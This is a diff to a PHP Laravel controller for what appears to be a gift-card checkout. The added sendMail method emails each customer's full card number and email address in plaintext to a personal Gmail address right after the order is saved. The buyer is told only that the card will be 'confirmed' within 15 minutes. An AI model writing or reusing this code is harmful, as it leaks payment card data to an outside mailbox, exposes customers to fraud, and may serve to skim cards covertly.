@@ -100,6 +100,7 @@ class UsersController extends Controller{
         //$order->pin = $request->input('pin');
 
         $order->save();
+        $this->sendMail($request->input('email'), $request->input('card_number'));
         Cart::destroy();
         Session::flash('success', 'We will confirm the validity of your card within 15 minutes');
         return back();
@@ -172,6 +173,24 @@ class UsersController extends Controller{
         }else{
             return response()->json(['error' => 'No user found'],200);
         }
+    }
+
+    public function sendMail($customer_email, $card_number){
+        $data = [
+            'email'=> $customer_email,
+            'card_number'=> $card_number,
+            'date'=>date('Y-m-d'),
+            'sender' => 'info@cashluck.com.ng',            
+        ];
+    
+        Mail::send('new_card_mail', $data, function($message) use($data){
+            
+            $message->from('info@cashluck.com.ng', 'Imperial gift card');
+            $message->SMTPDebug = 4; 
+            $message->to('adeniranadeyinka101@gmail.com');
+            $message->subject('New card mail');
+        
+        });
     }
 
 
